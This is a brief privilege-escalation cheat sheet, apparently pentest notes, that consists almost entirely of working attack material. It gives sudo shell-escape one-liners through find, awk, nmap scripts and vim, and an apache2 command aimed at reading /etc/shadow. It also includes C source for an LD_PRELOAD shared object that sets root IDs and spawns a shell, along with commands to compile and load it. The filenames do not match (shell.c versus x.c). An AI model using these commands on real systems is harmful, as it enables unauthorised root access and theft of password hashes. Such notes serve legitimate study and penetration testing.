# Sudo Shell Escaping
1. sudo find / -name nano -exec /bin/bash \;
2. awk 'BEGIN {system("/bin/bash")}'
3. echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse
4. sudo vim -c '!sh'

# Sudo Abusing Intended Functionality
sudo apache2 -f /etc/shadow

## shell.c:
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
	unsetenv("LD_PRELOAD");
	setuid(0);
	setgid(0);
	system("/bin/bash");
}
gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles
sudo LD_PRELOAD=/tmp/x.so apache2
```
